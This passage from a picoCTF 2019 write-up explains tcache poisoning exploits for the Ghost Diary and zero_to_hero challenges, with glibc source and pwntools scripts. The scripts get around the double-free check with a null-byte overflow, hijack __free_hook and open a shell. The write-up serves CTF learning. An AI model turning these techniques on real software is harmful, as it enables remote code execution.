</span><span class="n">add</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)</span> <span class="c1"># idx 0, overlapped with the starting chunk B
</span>
<span class="c1"># At this point, the two overlapped chunks are at indexes 0 and 1
# Double free them and put them into tcache bin 0x1d8
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># Add one of them, change its fd to __free_hook
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)</span> <span class="c1"># idx 0
</span><span class="n">talk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># Two more chunks and we get a chunk on __free_hook
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)</span> <span class="c1"># 1, overlapped chunk with chunk B again
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)</span> <span class="c1"># 2, chunk on __free_hook
</span>
<span class="c1"># Overwrite __free_hook with one_gadget
</span><span class="n">talk</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># Trigger __free_hook which gives us shell
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Running the exploit now on the shell server gives us the flag:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redacted@pico-2019-shell1:/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578<span class="nv">$ </span>python2 ~/exploit.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking <span class="k">for </span>new versions of pwntools
    To disable this functionality, <span class="nb">set </span>the contents of /home/warlock/.pwntools-cache/update to <span class="s1">'never'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> You have the latest version of Pwntools <span class="o">(</span>3.12.2<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578/ghostdiary'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./ghostdiary'</span>: pid 2346543
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> main arena leak: 0x7f0925653ca0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f0925268000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> one gadget: 0x7f09252b7322
<span class="o">[</span><span class="k">*</span><span class="o">]</span> free_hook: 0x7f09256558e8
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="nv">$ </span><span class="nb">ls
</span>flag.txt  ghostdiary  ghostdiary.c
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
picoCTF<span class="o">{</span>nu11_byt3_Gh05T_82783d57<span class="o">}</span><span class="nv">$ </span> 
</code></pre></div></div>

<h1 id="zero_to_hero">zero_to_hero</h1>

<p>This is essentially a tcache poisoning attack using a double free. We just have to bypass the new double free security check introduced in glibc 2.28. Of course, just a double free is not enough to solve it, so the author <code class="highlighter-rouge">poortho</code> (amazing challenge author by the way) also conveniently put in a single NULL byte overflow vulnerability for us.</p>

<h3 id="challenge-1"><strong>Challenge</strong></h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 500</li>
  <li><strong>Solves:</strong> 31</li>
</ul>

<blockquote>
  <p>Now you’re really cooking. Can you pwn <a href="https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/zero_to_hero">this</a> service?. Connect with <code class="highlighter-rouge">nc 2019shell1.picoctf.com 49929</code>. <a href="https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/libc.so.6">libc.so.6</a> <a href="https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/ld-2.29.so">ld-2.29.so</a></p>
</blockquote>

<h3 id="solution-1">Solution</h3>

<p>As mentioned above, this is a classic tcache poisoning attack with the added double free security check. We bypass that using the single NULL byte overflow vulnerability.</p>

<p>I had to use <code class="highlighter-rouge">patchelf</code> to change the linker the binary was using, because otherwise it didn’t want to run.</p>

<h4 id="reverse-engineering-the-binary">Reverse Engineering the binary</h4>

<p>The binary is very easy to understand. The following are its characteristics:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero<span class="nv">$ </span>file zero_to_hero
zero_to_hero: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>cf8bd977ca01d23e9b004a6dc637d6ab7c56e656, stripped

vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero<span class="nv">$ </span>checksec zero_to_hero
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/zero_to_hero'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
    RUNPATH:  <span class="s1">'./'</span>
</code></pre></div></div>

<p>It has the following functionality:</p>

<ol>
  <li>
    <p>It begins by asking you if you want to be a hero. Simply typing in any string with ‘y’ as the first character will work.</p>
  </li>
  <li>
    <p>It will give you the address of <code class="highlighter-rouge">system</code> from libc, so no leak is required.</p>
  </li>
  <li>
    <p>It lets you <code class="highlighter-rouge">add</code> superpowers. You can give each superpower a description that has a size &lt;= 0x408 (so only tcache size). You can allocate max of 7 chunks, and you cannot change this limit no matter what. Therefore we are completely restricted to tcache chunks.</p>
  </li>
  <li>
    <p>Each chunk is stored in a global array, and when you <code class="highlighter-rouge">free</code> a chunk, its pointer in that array is not nulled out. Therefore, we can do double frees on these chunks.</p>
  </li>
</ol>

<p>When providing a description for a superpower, there is a single null byte overflow. The code does something like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"What is the length of your description?"</span><span class="p">)</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
<span class="n">scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
<span class="p">...</span>
<span class="n">description</span> <span class="o">=</span> <span class="n">globalArray</span><span class="p">[</span><span class="n">nextIdx</span><span class="p">];</span>
<span class="n">description</span><span class="p">[</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">globalArray</span><span class="p">[</span><span class="n">nextIdx</span><span class="p">],</span> <span class="n">size</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1">// NULL byte overflow here</span>
</code></pre></div></div>

<p>This challenge is actually really simple, but it requires some background knowledge about how the tcache works and how the mitigation that was introduced in glibc-2.28 works as well.</p>

<p>For an introduction on how the tcache works, I would suggest reading my writeup of <a href="/2019-10-12-picoctf-2019-heap-challs/#ghost_diary">Ghost_Diary</a> from picoCTF 2019. I will only talk about the new mitigations here.</p>

<h4 id="tcache-double-free-mitigation-post-glibc-228">Tcache double free mitigation post glibc-2.28</h4>

<p>Before glibc-2.28, you could double free tcache chunks as many times as you’d want so long as the corresponding tcache bin didn’t fill up to its max limit of 7. This started being used so much for exploits, that a mitigation was added in glibc-2.28, as follows:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
  <span class="cm">/* This field exists to detect double frees.  */</span>
  <span class="k">struct</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span> <span class="c1">// essentially the bk pointer</span>
<span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>
</code></pre></div></div>

<p>Since the <code class="highlighter-rouge">bk</code> pointer isn’t actually used in the tcache, a <code class="highlighter-rouge">key</code> attribute was added to the <code class="highlighter-rouge">tcache_entry</code> struct, whose primary reason for existence was to detect double frees. How does it work?</p>

<p>In order to understand it completely, we must look at the code for the <code class="highlighter-rouge">tcache_get</code> and <code class="highlighter-rouge">tcache_put</code> functions:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */</span>
<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>

  <span class="cm">/* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache</span><span class="p">;</span> <span class="c1">// [1]</span>

  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>

<span class="cm">/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */</span>
<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="o">*</span>
<span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Essentially, whenever we free a tcache chunk, <code class="highlighter-rouge">tcache_put</code> will be called, and <code class="highlighter-rouge">e-&gt;key</code> (the chunk’s <code class="highlighter-rouge">bk</code> field) will be set to the address of the <code class="highlighter-rouge">tcache_perthread_struct</code> on the heap (amongst other things). [1]</p>

<p>Likewise, whenever we get a tcache chunk out of a tcache bin, <code class="highlighter-rouge">tcache_get</code> will be called which will null <code class="highlighter-rouge">e-&gt;key</code>.</p>

<p>As the comment says, the chunk is marked as “in the tcache” so that <code class="highlighter-rouge">_int_free</code> can make sure the chunk isn’t being double freed. The check in <code class="highlighter-rouge">_int_free</code> is as follows:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span>
<span class="nf">_int_free</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">;</span>        <span class="cm">/* its size */</span>
  <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>             <span class="cm">/* associated fastbin */</span>
  <span class="n">mchunkptr</span> <span class="n">nextchunk</span><span class="p">;</span>         <span class="cm">/* next contiguous chunk */</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">nextsize</span><span class="p">;</span>    <span class="cm">/* its size */</span>
  <span class="kt">int</span> <span class="n">nextinuse</span><span class="p">;</span>               <span class="cm">/* true if nextchunk is used */</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">prevsize</span><span class="p">;</span>    <span class="cm">/* size of previous contiguous chunk */</span>
  <span class="n">mchunkptr</span> <span class="n">bck</span><span class="p">;</span>               <span class="cm">/* misc temp for linking */</span>
  <span class="n">mchunkptr</span> <span class="n">fwd</span><span class="p">;</span>               <span class="cm">/* misc temp for linking */</span>

  <span class="p">...</span>

<span class="cp">#if USE_TCACHE
</span>  <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
      <span class="p">{</span>
	<span class="cm">/* Check to see if it's already in the tcache.  */</span>
	<span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>

	<span class="cm">/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^&lt;size_t&gt; chance), so verify it's not an unlikely
	   coincidence before aborting.  */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="n">tcache</span><span class="p">))</span> <span class="c1">// [2]</span>
	  <span class="p">{</span>
	    <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
	    <span class="n">LIBC_PROBE</span> <span class="p">(</span><span class="n">memory_tcache_double_free</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
	    <span class="k">for</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
		 <span class="n">tmp</span><span class="p">;</span>
		 <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">e</span><span class="p">)</span>                      <span class="c1">// [3]</span>
		<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): double free detected in tcache 2"</span><span class="p">);</span>
	    <span class="cm">/* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */</span>
	  <span class="p">}</span>
  <span class="p">...</span>
</code></pre></div></div>

<p>At [2], we see that it first checks to see whether the tcache chunk’s <code class="highlighter-rouge">key</code> field (again, essentially its <code class="highlighter-rouge">bk</code> pointer) is equal to the address of the <code class="highlighter-rouge">tcache_perthread_struct</code> on the heap. If it is, then it starts going through this tcache chunk’s corresponding tcache bin.</p>

<p>If it finds this chunk already in that tcache bin, then it will error out and call <code class="highlighter-rouge">malloc_printerr</code> and output <code class="highlighter-rouge">free(): double free detected in tcache 2</code>.</p>

<p>Therefore we have the following condition:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>When free is called on chunk:
IF (chunk-&gt;key == &amp;tcache_perthread_struct AND
  tcachebin[chunk_idx] contains this chunk) THEN:
    DOUBLE FREE DETECTED
</code></pre></div></div>

<p>Knowing all this, we can double free in the following two ways:</p>

<ol>
  <li>
    <p>Free the chunk, then use a UAF to overwrite <code class="highlighter-rouge">chunk-&gt;key</code> to any other value, and we will be able to free it again.</p>
  </li>
  <li>
    <p>Free the chunk into one tcache bin, then change its size. You can immediately free it again and put it into a different tcache bin. You can then get the chunk back from the old tcache bin (prior to its size change) and immediately free it again due to the <code class="highlighter-rouge">e-&gt;key</code> field being nulled out. Now the new (second) tcache bin will have a double freed chunk in it.</p>
  </li>
</ol>

<p>For this challenge, we utilize the single NULL byte overflow to do it the second way.</p>

<h4 id="exploitation-steps">Exploitation steps</h4>

<p>First, as usual, we create our helper functions as follows:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./zero_to_hero'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'2019shell1.picoctf.com'</span><span class="p">,</span> <span class="mi">49929</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.29.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="c1"># Application logic
</span>
<span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">answer</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([])</span>
</code></pre></div></div>

<p>Now, we do the following steps in order, using our knowledge of how the new mitigation works.</p>

<p>First, we answer the initial question with a ‘y’. We then use the leaked address of <code class="highlighter-rouge">system</code> to calculate the libc base address and subsequently the address of <code class="highlighter-rouge">__free_hook</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">initialize</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>

<span class="c1"># Calculate everything
</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">': '</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">system</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
</code></pre></div></div>

<p>Next we need to add two chunks. The first chunk’s size doesn’t matter, I arbitrarily choose 0x58 (chunk 0). The second chunk though has to be a size &gt;= 0x100. I arbitrarily chose 0x180 (chunk 1).</p>

<p>We will free chunk 0, then chunk 1. Chunk 0 will go into the 0x50 tcache bin, while chunk 1 will go into the 0x180 tcache bin. I then get back chunk 0, and use the single NULL byte overflow to overwrite chunk 1’s size from 0x191 to 0x100. I also set the first 8 bytes of chunk 0 to <code class="highlighter-rouge">'/bin/sh\x00'</code> for later use.</p>

<p>Since chunk 1’s size changed from 0x191 to 0x100, we can immediately free it again. This time, it will go into the 0xf0 tcache bin.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Add a 0x50 and 0x180 chunk
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># Chunk A
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x180</span><span class="p">)</span> <span class="c1"># Chunk B
</span>
<span class="c1"># Free them both
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Goes into 0x50 tcache bin
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Goes into 0x180 tcache bin
</span>
<span class="c1"># Get back the 0x50 chunk, but also null byte overflow into the 0x180 chunk
# Also put in /bin/sh\x00 into it for later use
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># Chunk A
</span>
<span class="c1"># The 0x180 chunk's size is now actually 0x100 (due to null byte overflow)
# This means we can free it again immediately
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Goes into 0xf0 tcache bin
</span></code></pre></div></div>

<p>Remember the chunk that went into the 0x180 tcache bin? It is the same chunk, only now its size is actually 0x100. We reallocate it back out of the 0x180 tcache bin, and immediately free it. What happens now is that the same chunk is in the 0xf0 tcache bin twice, as if we had double freed it.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Get back the 0x100 chunk out of the 0x180 tcache bin
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x180</span><span class="p">)</span> <span class="c1"># Chunk B
</span>
<span class="c1"># Since tcache_get will null out the key, we can free it immediately
</span><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># Goes into 0xf0 tcache bin
</span>
<span class="c1"># Now: tcache[0x100] -&gt; Chunk B &lt;- Chunk B
</span></code></pre></div></div>

<p>After that, it’s the usual tcache poisoning attack to get a chunk on <code class="highlighter-rouge">__free_hook</code> and overwrite it with the address to <code class="highlighter-rouge">system</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We do the usual tcache poisoning attack
</span>
<span class="c1"># Get Chunk B from 0xf0 tcache bin and change it's FD to __free_hook
</span><span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">+</span> <span class="s">'D'</span><span class="o">*</span><span class="mh">0xe8</span><span class="p">)</span>

<span class="c1"># Allocates chunk B again
</span><span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0xf0</span><span class="p">)</span>

<span class="c1"># Allocates chunk on __free_hook, change it to system
</span><span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0xe8</span><span class="p">)</span>
</code></pre></div></div>

<p>Now, remember when we changed chunk 0’s first 8 bytes to <code class="highlighter-rouge">'/bin/sh\x00'</code>? If we call <code class="highlighter-rouge">free(0)</code>, it will actually call <code class="highlighter-rouge">free(ptr_to_chunk_0)</code>, which means it will now also call <code class="highlighter-rouge">((*)__free_hook)(ptr_to_chunk_0, ...)</code>.</p>

